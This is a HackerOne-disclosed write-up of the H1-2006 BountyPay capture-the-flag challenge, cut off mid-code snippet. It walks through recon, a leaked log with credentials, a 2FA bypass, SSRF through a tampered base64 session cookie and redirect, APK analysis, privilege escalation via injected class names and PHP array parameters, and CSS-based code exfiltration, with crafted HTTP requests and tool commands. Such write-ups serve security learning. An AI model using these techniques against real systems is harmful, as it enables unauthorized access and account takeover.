{"id":895778,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84OTU3Nzg=","url":"https://hackerone.com/reports/895778","title":"[H1-2006] CTF Writeup","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2020-06-11T03:30:20.287Z","submitted_at":"2020-06-11T03:30:20.287Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"nirvana_msu","url":"/nirvana_msu","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/451/521/1d0f6443db7f9182f369d52763f1e423273fd58c_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":46757,"url":"https://hackerone.com/h1-ctf","handle":"h1-ctf","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"h1-ctf","twitter_handle":"Hacker0x01","website":"","about":"todayisnew reached 100K rep. Let's celebrate with a CTF!"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-06-19T18:07:46.713Z","bug_reporter_agreed_on_going_public_at":"2020-06-19T18:01:39.058Z","team_member_agreed_on_going_public_at":"2020-06-19T18:07:46.629Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"# H1-2006 CTF Writeup\n\nI am fairly new to CTFs - this is just my second CTF after [H1-415 CTF](https://twitter.com/Hacker0x01/status/1217561343986782209), at which I didn't get far at all. I think the most valuable thing I can do for anyone who comes across this writeup, is to describe exactly what I was thinking at each step along the way, including all my failures and dead ends. I personally always find those parts the most valuable in any bug report or writeup that I read.\n\n---------------------------------------\n\n# TL;DR\n**For those impatient, here is a condensed walk-through of the CTF. If you're here after the long writeup, you can safely skip this part.**.\n\n1. Subdomain enumeration yields several subdomains: `app.bountypay.h1ctf.com` (customer portal with username/password login), `staff.bountypay.h1ctf.com` (staff portal with username/password login), `api.bountypay.h1ctf.com`, `software.bountypay.h1ctf.com`(denies access from public IPs).\n2. Content discovery on `app.bountypay.h1ctf.com` reveals `/.git/config` which references GitHub repo at [https://github.com/bounty-pay-code/request-logger.git](https://github.com/bounty-pay-code/request-logger.git)\n3. Source code in the repo exposes the presence of [`/bp_web_trace.log`](http://app.bountypay.h1ctf.com/bp_web_trace.log) file, which gives us three things:\n    *  Log file gives us `username` and `password` for authentication on the customer portal, `app.bountypay.h1ctf.com`. Using these credentials we're presented with 2FA challenge. On every access It gives us a random `challenge` (md5 hash) that we need to guess a valid `challenge_answer` for.\n    * Log file also gives us a `challenge_answer` (for the past login attempt), but no `challenge` itself. The solution is that `challenge` is simply an md5 hash of the `challenge_answer`, and there is nothing preventing the re-use of the old challenge, so we compute md5 hash of that `challenge_answer` and use this pair to login.\n    * Last thing the log file gives us is the following endpoint: `GET /statements?month=04\u0026year=2020`\n4. Authentication cookie is base64-encoded JSON such as `{\"account_id\":\"F8gHiqSdpK\",\"hash\":\"de235bffd23df6995ad4e0930baac1a2\"}`, where `hash` is the actual session, while `account_id` can be freely tampered with.\n5. The `/statements` endpoint above reveals that it makes a server-side request to `https://api.bountypay.h1ctf.com/api/accounts/F8gHiqSdpK/statements?month=04\u0026year=2020`.  When accessed directly, the API endpoint responds with 401 `[\"Missing or invalid Token\"]`. Observe the same account id value, `F8gHiqSdpK`, within the request path- which is in fact taken from `account_id` of the session cookie and interpolated into request path without any sanitization. By changing `account_id` within our authentication cookie we can thus achieve SSRF via Path Traversal - but for now only on same host.\n6. Front page on `api.bountypay.h1ctf.com` reveals an endpoint that allows a redirect: `https://api.bountypay.h1ctf.com/redirect?url=https://www.google.com/search?q=REST+API`. It uses a whitelist and does not appear to allow an Open Redirect, but several BountyPay subdomains are whitelisted, including `software.bountypay.h1ctf.com`.\n7.  Content discovery on `software.bountypay.h1ctf.com` via SSRF with the aforementioned redirect (which bypasses IP restriction) reveals `/uploads` folder with Directory Listing enabled. The only file within it, [`BountyPay.apk`](http://software.bountypay.h1ctf.com/uploads/BountyPay.apk), can be downloaded directly from a public IP.\n8. APK interacts with a Firebase instance and presents a series of screens that eventually lead to obtaining a header name (`X-Token`), a header value (`8e9998ee3137ca9ade8f372739f062c1`) and a host name (`api.bountypay.h1ctf.com`). One way those could be obtained is by decompiling the code and following the designed challenges, which involve sending [deep links](https://developer.android.com/training/app-links/deep-linking) to the app. The data of interest could either be intercepted with a proxy, or retrieved  from `/shared_prefs/user_created.xml` with `adb`. Or alternatively one could also have interacted with Firebase directly, using the credentials that are located in `res/values/strings.xml`.\n9. `X-Token: 8e9998ee3137ca9ade8f372739f062c1` allows us to make API calls directly on `api.bountypay.h1ctf.com` without SSRF - including `POST` calls that we could not do before. Content discovery on the `/api` directory reveals `/api/staff` endpoint.\n    * `GET` request returns some JSON data for a couple of staff members, which includes `staff_id`field with values like `STF:KE624RQ2T9`.\n    * `POST` request returns `[\"Missing Parameter\"]` message. The parameter it wants is `staff_id`, and for the valid staff ids it gives `HTTP/1.1 409 Conflict` with message ` [\"Staff Member already has an account\"]`. Response code hints at the fact that it could provision the new account if we give it a valid  staff id who's account has not yet been set up - e.g. a new joiner.\n10. [BountypayHQ](https://twitter.com/BountypayHQ) Twitter account has a tweet `Today we welcome Sandra to the team!!!`, which is the new joiner we're looking for. We can find [Sandra's](https://twitter.com/SandraA76708114) twitter account among either [following](https://twitter.com/BountypayHQ/following) or [followers](https://twitter.com/BountypayHQ/followers) lists for BountypayHQ, and in her timeline we see [this tweet](https://twitter.com/SandraA76708114/status/1258693001964068864) with a photo featuring her staff access card that shows her Staff ID: `STF:8FJ3KFISL3`.\n11. Using this `staff_id` in a `POST` request to `/api/staff` provisions a new account, giving us `username` and `password` to access Staff portal at `staff.bountypay.h1ctf.com`.\n12.  After logging in with Sandra's credentials and inspecting available endpoints and JS source code, it becomes apparent that the goal of the next challenge is to upgrade her account to Admin. We can see the endpoint for this in JS code, `/admin/upgrade?username=`, but it can only be done by an admin user. We can \"report\" any page, which makes admin user visit it, but there is an exception that pages under `/admin` would not be visited. There are two separate vulnerabilities that need to be chained to achieve the desired result.\n    * Firstly, the trick is to notice that JS code uses very loose selectors (that are based on class only) to perform several actions: `$(\".upgradeToAdmin\").click` would issue the request to upgrade the account, and `\"#tab4\" === document.location.hash \u0026\u0026 $(\".tab4\").trigger(\"click\")` allows us to force Admin to do the click on an element with `.tab4` class. Coincidentally, there is a feature to change avatar - which is a string used as a class name. Setting it to `upgradeToAdmin tab4` and reporting that page (`/?template=ticket\u0026ticket_id=3582#tab4`) allows us to force Admin to make the API call.\n    * What remains is to make sure the above call is made with the correct username, which is taken from an input with name `username`: `let t = $('input[name=\"username\"]').val();`. There is no such input on the page we're reporting (where we can control the class via avatar), `/?template=ticket\u0026ticket_id=3582#tab4`, but there is one in the login page, `/?template=login?username=sandra.allison`. Since backend is PHP we can force `template` parameter to be an array with both `ticket` and `login` values - and luckily for us, a rather weird backend implementation renders both templates and appends them one after another in the response. We can thus piece it all together in a request such as `/?template[]=login\u0026username=sandra.allison\u0026template[]=ticket\u0026ticket_id=3582#tab4` that we \"report\" to Admin and this concludes the Privilege Escalation step. In response we're given a new session cookie - when logged in with that cookie we can see a new tab with customer account usernames and clear-text passwords, including Mårten's credentials.\n13. Back to Customer portal, `app.bountypay.h1ctf.com`, we login with new credentials and use same `challenge`/`challenge_answer`pair as before to bypass login 2FA. We now have access to the transactions that need to be processed, but there is one last challenge - it is protected by another 2FA. The task is to exfiltrate challenge answer (code) from a page rendered in the backend within Headless Chrome, and the only thing we know about that page, is that is takes a stylesheet from a URL that's under our control and likely embeds it in that page. It can indeed be verified that our stylesheet is embedded within a `\u003clink rel=\"stylesheet\"\u003e` tag with e.g. Burp Collaborator. Under this setup it's not actually possible to exfiltrate data using [recursive techniques](https://medium.com/@d0nut/better-exfiltration-via-html-injection-31c72a2dae8b) such as asynchronous `@import` loading - because imports within `\u003clink\u003e` (unlike `\u003cstyle\u003e`) are synchronous, and we only have a single injection point. Thankfully for us, the recursive import is not needed since we discover there are multiple inputs on the page - one for each code character. So the entire code can be exfiltrated directly using a bunch of selectors. With the exfiltrated code we complete 2FA verification and are finally presented with the Flag. That is the end of the CTF.\n\n---------------------------------------\n\n# Long Writeup\n\nFor those more patient, as promised in the beginning, here is a long writeup where I attempt to describe my process of thinking, including all failed attempts and dead ends.\n\nAs usual, the challenge starts with a [tweet](https://twitter.com/Hacker0x01/status/1266454022124376064):\n{F861473}\n\n## Reconnaissance\n\nLooking at the `Scope` section of the CTF [Policy] (https://hackerone.com/h1-ctf?view_policy=true) page, we notice that the domain scope is a wildcard `*.bountypay.h1ctf.com`. An obvious first thing to do is thus to kick off a subdomain enumeration (and frankly one should do this anyway).\n\nMy go-to tool for subdomain enumeration from passive data sources is [Amass](https://github.com/OWASP/Amass). Although you should ideally set it up with all API keys to various data sources, a simple passive enumeration can be done with just:\n```bash\n$ amass enum --passive -d bountypay.h1ctf.com\n```\n\n\u003e I recommend Amass only for passive enumeration. For bruteforcing you'd be better off using [Massdns](https://github.com/blechschmidt/massdns) with a carefully curated list of resolvers. For the reasons why, I highly recommend the excellent post [Subdomain Enumeration: 2019 Workflow](https://0xpatrik.com/subdomain-enumeration-2019/) by [Patrik Hudak](https://twitter.com/0xpatrik) - in fact his entire blog is worth a careful read. \n\nThis enumeration yielded several subdomains:\n\n```plain\napp.bountypay.h1ctf.com\nstaff.bountypay.h1ctf.com\napi.bountypay.h1ctf.com\nwww.bountypay.h1ctf.com\nsoftware.bountypay.h1ctf.com\n```\nFollowing my normal bug hunting routine I then tried to brute-force for more subdomains using [Massdns](https://github.com/blechschmidt/massdns)  with [commonspeak2](https://github.com/assetnote/commonspeak2-wordlists/blob/master/subdomains/subdomains.txt) wordlist, as well as using alterations on existing names with [dnsgen](https://github.com/ProjectAnte/dnsgen), but this did not yield any new results.\n\nNext, I kicked off content discovery on each subdomain. In this instance I've simply used Burp (`Engagement tools`-\u003e`Discover content`), though I can also highly recommend using [ffuf](https://github.com/ffuf/ffuf) for this with a good wordlist.\n\nWhile this was running, I manually reviewed each subdomain - HTML and JS code. First observations:\n * `app` and `staff` subdomains require username/password authentication. I've tried a few naive things (like empty password, admin:admin etc) but nothing worked.\n * `software` subdomain appears to restrict access from public IPs: `You do not have permission to access this server from your IP Address`. Simple things like adding `X-Forwarded-For` or `X-Client-IP`pointing to localhost or other private addresses did not change anything. It is likely that we're going to need to find SSRF to interact with it.\n * `api` subdomain has an interesting redirect in its home page: `https://api.bountypay.h1ctf.com/redirect?url=https://www.google.com/search?q=REST+API`. Changing target host to something else, like `example.com`, returns `URL NOT FOUND IN WHITELIST`. My first thought was that the whitelist check could be flawed and it could be vulnerable to an Open Redirect (which might prove useful later, such as e.g. for SSRF) but no trick I could think of worked and it seemed pretty secure (I even tried CRLF injection, also no luck). So if it's a whitelist - then what else could be whitelisted? The obvious thing to try were the other subdomains - and it turns out `software` and `staff` are indeed whitelisted. For now let's just take a note of it, as it might be useful for SSRF - especially to access `software` subdomain which is otherwise restricted by IP.\n\nChecking the content discovery results, I've found the first lead - exposed `/.git/` folder on the `app` subdomain, referencing a GitHub repository:\n\n\u003e Note: In all HTTP requests/responses within this writeup, only the most relevant headers are shown for brevity.\n\n```http\nGET /.git/config HTTP/1.1\nHost: app.bountypay.h1ctf.com\n```\n\n```http\nHTTP/1.1 200 OK\n\n[core]\n\trepositoryformatversion = 0\n\tfilemode = true\n\tbare = false\n\tlogallrefupdates = true\n[remote \"origin\"]\n\turl = https://github.com/bounty-pay-code/request-logger.git\n\tfetch = +refs/heads/*:refs/remotes/origin/*\n[branch \"master\"]\n\tremote = origin\n\tmerge = refs/heads/master\n```\n\nIt was slightly weird that nearly all other files that are normally present were not there. but that's just part of the CTF. Nevertheless I did try to exfiltrate the content of the repo with [gitdumper.sh](https://github.com/internetwache/GitTools/blob/master/Dumper/gitdumper.sh):\n```bash\n$ ./gitdumper.sh https://app.bountypay.h1ctf.com/.git/ ./output/\n```\nbut that didn't yield anything new.\n\nOk, so all we need from this is the GitHub repo itself.  I've checked this repo (including commit history) and the parent organization, but the only valuable piece of information was [logger.php](https://github.com/bounty-pay-code/request-logger/blob/master/logger.php) file:\n```php\n\u003c?php\n\n$data = array(\n  'IP'        =\u003e  $_SERVER[\"REMOTE_ADDR\"],\n  'URI'       =\u003e  $_SERVER[\"REQUEST_URI\"],\n  'METHOD'    =\u003e  $_SERVER[\"REQUEST_METHOD\"],\n  'PARAMS'    =\u003e  array(\n      'GET'   =\u003e  $_GET,\n      'POST'  =\u003e  $_POST\n  )\n);\n\nfile_put_contents('bp_web_trace.log', date(\"U\").':'.base64_encode(json_encode($data)).\"\\n\",FILE_APPEND   );\n```\n\nMy first thought was the access `/logger.php` endpoint, but that didn't exist. I then tried accessing `/bp_web_trace.log` and that worked!\n\n```http\nGET /bp_web_trace.log HTTP/1.1\nHost: app.bountypay.h1ctf.com\n```\n\n```http\nHTTP/1.1 200 OK\n\n1588931909:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJHRVQiLCJQQVJBTVMiOnsiR0VUIjpbXSwiUE9TVCI6W119fQ==\n1588931919:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIn19fQ==\n1588931928:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIiwiY2hhbGxlbmdlX2Fuc3dlciI6ImJEODNKazI3ZFEifX19\n1588931945:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC9zdGF0ZW1lbnRzIiwiTUVUSE9EIjoiR0VUIiwiUEFSQU1TIjp7IkdFVCI6eyJtb250aCI6IjA0IiwieWVhciI6IjIwMjAifSwiUE9TVCI6W119fQ==\n```\n\nI also tried checking both `/logger.php` and `/bp_web_trace.log`on the other subdomains, just in case similar code was deployed there as well, but that didn't work.\n\nDecoding the base64-encoded log entries gives us:\n\n```json\n{\"IP\":\"192.168.1.1\",\"URI\":\"\\/\",\"METHOD\":\"GET\",\"PARAMS\":{\"GET\":[],\"POST\":[]}}\n{\"IP\":\"192.168.1.1\",\"URI\":\"\\/\",\"METHOD\":\"POST\",\"PARAMS\":{\"GET\":[],\"POST\":{\"username\":\"brian.oliver\",\"password\":\"V7h0inzX\"}}}\n{\"IP\":\"192.168.1.1\",\"URI\":\"\\/\",\"METHOD\":\"POST\",\"PARAMS\":{\"GET\":[],\"POST\":{\"username\":\"brian.oliver\",\"password\":\"V7h0inzX\",\"challenge_answer\":\"bD83Jk27dQ\"}}}\n{\"IP\":\"192.168.1.1\",\"URI\":\"\\/statements\",\"METHOD\":\"GET\",\"PARAMS\":{\"GET\":{\"month\":\"04\",\"year\":\"2020\"},\"POST\":[]}}\n```\n\nOk, so we have a username and password (and also something called `challenge_answer`).\n\n## Login 2FA Bypass\n\nWhen we try to login using these credentials, we're presented with a 2FA challenge:\n\n```http\nPOST / HTTP/1.1\nHost: app.bountypay.h1ctf.com\n\nusername=brian.oliver\u0026password=V7h0inzX\n```\n\n```html\n\u003cform method=\"post\" action=\"/\"\u003e\n\t\u003cinput type=\"hidden\" name=\"username\" value=\"brian.oliver\"\u003e\n\t\u003cinput type=\"hidden\" name=\"password\" value=\"V7h0inzX\"\u003e\n\t\u003cinput type=\"hidden\" name=\"challenge\" value=\"8de5d288e39ef1beaa3833100a14aa47\"\u003e\n\t\u003cdiv class=\"panel panel-default\" style=\"margin-top:50px\"\u003e\n\t\t\u003cdiv class=\"panel-heading\"\u003eLogin\u003c/div\u003e\n\t\t\u003cdiv class=\"panel-body\"\u003e\n\t\t\t\u003cdiv style=\"margin-top:7px\"\u003e\u003clabel\u003eFor Security we've sent a 10 character password to your mobile phone, please enter it below\u003c/label\u003e\u003c/div\u003e\n\t\t\t\u003cdiv style=\"margin-top:7px\"\u003e\u003clabel\u003ePassword contains characters between A-Z , a-z and 0-9\u003c/label\u003e\u003c/div\u003e\n\t\t\t\u003cdiv\u003e\u003cinput name=\"challenge_answer\" class=\"form-control\"\u003e\u003c/div\u003e\n\t\t\u003c/div\u003e\n\t\u003c/div\u003e\n\t\u003cinput type=\"submit\" class=\"btn btn-success pull-right\" value=\"Login\"\u003e\n\u003c/form\u003e\n```\n\nSo we have a `challenge` parameter that looks like an MD5 hash (unique for every new request) that we need to find the valid `challenge_answer` for. Recall that we saw `challenge_answer` from Brian's authentication already in the log. Odd part there was that the log contained `challenge_answer` and not `challenge` - but that must have been done on purpose. It most likely means that the `challenge` and `challenge_answer` could be re-used, so `challenge` was removed it would otherwise be too easy. So maybe instead of trying to find `challenge_answer` for the new `challenge` hash that we're given, we should find `challenge` for that `challenge_answer` submitted by Brian?\n\nSo it's clearly an MD5 hash of something. It is also unique on each page reload, so there must be something unique about the string being hashed. That rules out the most obvious things like `username` etc. If it was really sufficiently random then we could never break it, so let's stay positive and assume that it's a unique thing - but something that we actually know. The only such thing that we have is actually the `challenge_answer` itself! I can't say this part of the CTF was \"obvious\" (and it did take me half an hour or so), but it was still a very logical conclusion if you carefully think it through.\n\nAnd indeed, taking MD5 hash of `bD83Jk27dQ` and submitting that as the `challenge`bypasses the 2FA:\n```http\nPOST / HTTP/1.1\nHost: app.bountypay.h1ctf.com\nContent-Type: application/x-www-form-urlencoded\n\nusername=brian.oliver\u0026password=V7h0inzX\u0026challenge=5828c689761cce705a1c84d9b1a1ed5e\u0026challenge_answer=bD83Jk27dQ\n```\n\n```http\nHTTP/1.1 302 Found\nSet-Cookie: token=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9; expires=Mon, 29-Jun-2020 23:36:42 GMT; Max-Age=2592000\nLocation: /\n```\n\n## SSRF\n\nFirst thing we notice is that the session cookie is base64-encoded JSON. When decoded, it is:\n```\n{\"account_id\":\"F8gHiqSdpK\",\"hash\":\"de235bffd23df6995ad4e0930baac1a2\"}\n```\n\nIt's very interesting and unusual to see a parameter like `account_id` here, so let's take note of that.\n\nAnother piece of information we have now is the javascript file [app.js](https://app.bountypay.h1ctf.com/js/app.js). It references the following endpoint: `\u003ca href=\"/pay/' + s.id + \"/\" + s.hash`, but upon trying to access something like `/pay/1/1` we get `page not found!` response. It clearly needs some valid `id` and `hash` values that we do not have at this stage. Judging from the code, it looks like that endpoint could be used to make the payment to hackers, which is the storyline of this CTF, so it'll likely be needed towards the end of the CTF. \n\nThe only other endpoint we can access, is the one that fetches statements:\n```http\nGET /statements?month=04\u0026year=2020 HTTP/1.1\nHost: app.bountypay.h1ctf.com\nCookie: token=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9\n```\n\n```http\nHTTP/1.1 200 OK\nContent-Type: application/json\n\n{\"url\":\"https:\\/\\/api.bountypay.h1ctf.com\\/api\\/accounts\\/F8gHiqSdpK\\/statements?month=04\u0026year=2020\",\"data\":\"{\\\"description\\\":\\\"Transactions for 2020-04\\\",\\\"transactions\\\":[]}\"}\n```\n\nJust in case, I've tried to check a range of other year/month combinations (using `Cluster bomb`Attack type within Burp's Intruder) but none returned any valid transactions.\n\nLooking at the response, it is clear the endpoint performs a server-side request to retrieve the data (and it also must have a valid token to authenticate with `api` subdomain). Somewhat unusually, it even shows us the full URL! This smells a lot like SSRF. First thing I've tried was fiddling with `month` and `year` parameters but it didn't yield anything interesting (and even if it did, it wouldn't be of much value as they are in query string, so we couldn't even do path traversal with that). What else can we control within this API request? It must be the account id that we saw in our session cookie before.. there's simply nothing else.\n\nAnd indeed  that worked. Let's try e.g. adding a `#` after the value: `{\"account_id\":\"F8gHiqSdpK#\",\"hash\":\"de235bffd23df6995ad4e0930baac1a2\"}` (base64-encode it and use it as the cookie):\n\n```http\nGET /statements?month=05\u0026year=2020 HTTP/1.1\nHost: app.bountypay.h1ctf.com\nCookie: token=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyMiLCJoYXNoIjoiZGUyMzViZmZkMjNkZjY5OTVhZDRlMDkzMGJhYWMxYTIifQ==\n```\n\n```http\nHTTP/1.1 200 OK\nContent-Type: application/json\n\n{\"url\":\"https:\\/\\/api.bountypay.h1ctf.com\\/api\\/accounts\\/F8gHiqSdpK#\\/statements?month=05\u0026year=2020\",\"data\":\"{\\\"account_id\\\":\\\"F8gHiqSdpK\\\",\\\"owner\\\":\\\"Mr Brian Oliver\\\",\\\"company\\\":\\\"BountyPay Demo \\\"}\"}\n```\n\nWe even found another endpoint and got some data back for Brian, but it doesn't seem to be particularly useful. Recall now that we have a `software` subdomain which looked like an obvious target for SSRF. But we can only do Path Traversal so far. This is where we clearly need to chain Path Traversal with a redirect to access `software` subdomain. Our payload (decoded session cookie) thus becomes: `{\"account_id\":\"../../redirect?url=https://software.bountypay.h1ctf.com/#\",\"hash\":\"de235bffd23df6995ad4e0930baac1a2\"}`\n\n```http\nGET /statements?month=05\u0026year=2020 HTTP/1.1\nHost: app.bountypay.h1ctf.com\nCookie: token=eyJhY2NvdW50X2lkIjoiLi4vLi4vcmVkaXJlY3Q/dXJsPWh0dHBzOi8vc29mdHdhcmUuYm91bnR5cGF5LmgxY3RmLmNvbS8jIiwiaGFzaCI6ImRlMjM1YmZmZDIzZGY2OTk1YWQ0ZTA5MzBiYWFjMWEyIn0=\n```\n\nThis presents us with a login panel. Extracting HTML from JSON response and prettifying it gives us:\n```html\n\u003c!DOCTYPE html\u003e\n\u003chtml lang=\"en\"\u003e\n\u003chead\u003e\n    \u003cmeta charset=\"utf-8\"\u003e\n    \u003cmeta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\"\u003e\n    \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1\"\u003e\n    \u003ctitle\u003eSoftware Storage\u003c/title\u003e\n    \u003clink href=\"/css/bootstrap.min.css\" rel=\"stylesheet\"\u003e\n\u003c/head\u003e\n\u003cbody\u003e\n\n\u003cdiv class=\"container\"\u003e\n    \u003cdiv class=\"row\"\u003e\n        \u003cdiv class=\"col-sm-6 col-sm-offset-3\"\u003e\n            \u003ch1 style=\"text-align: center\"\u003eSoftware Storage\u003c/h1\u003e\n            \u003cform method=\"post\" action=\"/\"\u003e\n                \u003cdiv class=\"panel panel-default\" style=\"margin-top:50px\"\u003e\n                    \u003cdiv class=\"panel-heading\"\u003eLogin\u003c/div\u003e\n                    \u003cdiv class=\"panel-body\"\u003e\n                        \u003cdiv style=\"margin-top:7px\"\u003e\u003clabel\u003eUsername:\u003c/label\u003e\u003c/div\u003e\n                        \u003cdiv\u003e\u003cinput name=\"username\" class=\"form-control\"\u003e\u003c/div\u003e\n                        \u003cdiv style=\"margin-top:7px\"\u003e\u003clabel\u003ePassword:\u003c/label\u003e\u003c/div\u003e\n                        \u003cdiv\u003e\u003cinput name=\"password\" type=\"password\" class=\"form-control\"\u003e\u003c/div\u003e\n                    \u003c/div\u003e\n                \u003c/div\u003e\n                \u003cinput type=\"submit\" class=\"btn btn-success pull-right\" value=\"Login\"\u003e\n            \u003c/form\u003e\n        \u003c/div\u003e\n    \u003c/div\u003e\n\u003c/div\u003e\n\u003cscript src=\"/js/jquery.min.js\"\u003e\u003c/script\u003e\n\u003cscript src=\"/js/bootstrap.min.js\"\u003e\u003c/script\u003e\n\u003c/body\u003e\n\u003c/html\u003e\n```\n\nThere isn't much we can do with it since SSRF only allows us to do `GET` requests and not `POST`. What else? As usual, content discovery.  This one is a little bit more tricky to setup since the payload is base64-encoded, but it can still be easily done in Burp. We need to set the whole session cookie value as the target,  and add 3 `Payload Processing` rules:\n1. \"Add prefix\" with value `{\"account_id\":\"../../redirect?url=https://software.bountypay.h1ctf.com/`\n2. \"Add suffix\" with value `#\",\"hash\":\"de235bffd23df6995ad4e0930baac1a2\"}`      (the part between them will be our actual payload for content discovery)\n3.  \"Encode\" -\u003e \"Base64-encode\"\n{F861592}\n\nI've used a fairly simple wordlist and got a hit pretty quickly - there is an `/uploads` endpoint with Directory Listing enabled. In hindsight, that could have been guessed pretty easily even without bruteforcing.\n\n```http\nGET /statements?month=05\u0026year=2020 HTTP/1.1\nHost: app.bountypay.h1ctf.com\nCookie: token=eyJhY2NvdW50X2lkIjoiLi4vLi4vcmVkaXJlY3Q/dXJsPWh0dHBzOi8vc29mdHdhcmUuYm91bnR5cGF5LmgxY3RmLmNvbS91cGxvYWRzLyMiLCJoYXNoIjoiZGUyMzViZmZkMjNkZjY5OTVhZDRlMDkzMGJhYWMxYTIifQ==\n```\nHTML code extracted from JSON response is:\n```html\n\u003chtml\u003e\n\u003chead\u003e\u003ctitle\u003eIndex of /uploads/\u003c/title\u003e\u003c/head\u003e\n\u003cbody bgcolor=\"white\"\u003e\n\u003ch1\u003eIndex of /uploads/\u003c/h1\u003e\u003chr\u003e\u003cpre\u003e\u003ca href=\"../\"\u003e../\u003c/a\u003e\n\u003ca href=\"/uploads/BountyPay.apk\"\u003eBountyPay.apk\u003c/a\u003e                                        20-Apr-2020 11:26              4043701\n\u003c/pre\u003e\u003chr\u003e\u003c/body\u003e\n\u003c/html\u003e\n```\n\nNot sure why, but I then tried to access APK via SSRF. It didn't work - which is consistent with the behaviour I observed for this SSRF where responses with certain content-types  were not forwarded back to us. I then tried to access the APK [directly](http://software.bountypay.h1ctf.com/uploads/BountyPay.apk), and sure enough it worked.\n\n## Android\n\nWhile one could start by grepping strings from an APK, I usually go straight to decompiling the Java code. For this I use [dex2jar](https://github.com/pxb1988/dex2jar)  with a command like:\n```bash\n$ ./d2j-dex2jar.sh -f -o ./../h1-ctf/jar/BountyPay.jar ./../h1-ctf/BountyPay.apk\n```\nIt produces a JAR file which you can then open in [JD-GUI](http://java-decompiler.github.io/). While you can browse the source code directly in JD-GUI, I much prefer JetBrains IDEs. You can export all decompiled code via \"Save all sources\" menu option, unzip the archive and use in in e.g. [IntelliJ IDEA](https://www.jetbrains.com/idea/).\n\nI then read all relevant parts of the source code (there isn't much, if you ignore all the standard android stuff) and it was fairly clear that the app interacts with a Firebase database and attempts to get your through 3 stages, at the end of which you should have some values for Header, Token and Host from that database.\n\nCredentials to access Firebase could be found in `res/values/strings.xml`:\n```xml\n\u003cstring name=\"firebase_database_url\"\u003ehttps://bountypay-90f64.firebaseio.com\u003c/string\u003e\n\u003cstring name=\"gcm_defaultSenderId\"\u003e467982724703\u003c/string\u003e\n\u003cstring name=\"google_api_key\"\u003eAIzaSyAyr601_-ElsasDnhGORBykg0ZTDaOxFeo\u003c/string\u003e\n\u003cstring name=\"google_app_id\"\u003e1:467982724703:android:4428e053082d32ce84b5ea\u003c/string\u003e\n\u003cstring name=\"google_crash_reporting_api_key\"\u003eAIzaSyAyr601_-ElsasDnhGORBykg0ZTDaOxFeo\u003c/string\u003e\n\u003cstring name=\"google_storage_bucket\"\u003ebountypay-90f64.appspot.com\u003c/string\u003e\n```\nI quickly checked for some common misconfigurations, such as whether Firebase was publicly readable by accessing https://bountypay-90f64.firebaseio.com/.json, but it seemed that access controls were properly configured.\n\nI knew I then had two routes - either to understand the code well enough to talk to a database directly and extract the needed data (and maybe write a small script for it) or to try and follow through the app exactly as it was designed. Former would have probably been quicker, but the latter seemed more interesting - so I went ahead and installed APK on an emulator.\n\nThere are different technologies you could use here. I'm not an expert in Android, but given how generally awesome IntelliJ platform is, the obvious choice for me was to use [Android Studio](https://developer.android.com/studio/).\n\nRunning emulator is fairly straight-forward, and is described in these guides:\n * https://developer.android.com/studio/run/emulator\n * https://developer.android.com/studio/run/managing-avds\n\nThe steps I've taken to set up my environment were as follows:\n\n1. Open Android Studio, select \"debug APK\" and point to APK file.\n2. Install Android SDK, if not already\n3. Create new device within AVD and start it\n\nI've also set up traffic proxying through Burp:\n1. Configure proxy in the Emulator's settings as described [here](https://developer.android.com/studio/run/emulator-networking).\n2. Install Burp's CA certificate on the device. You can follow Burp guide [here](https://portswigger.net/support/installing-burp-suites-ca-certificate-in-an-android-device) but I find it easier to push the certificate to device's SD card using `adb` (as opposed to sending it via email):\n\n```bash\n$ adb push cacert.cer /mnt/sdcard\n```\n\n### Android | PartOneActivity\n\nNow that everything is set up we can launch the app. First it just asks us for our username and (optional) twitter handle. On the next screen, nothing seems to happen, and the clues at the bottom say \"deep links\" and \"params\":\n{F862914}\n\nGoing back to our Java source code, within `PartOneActivity.java`, we see:\n```java\nif (getIntent() != null \u0026\u0026 getIntent().getData() != null) {\n  String str = 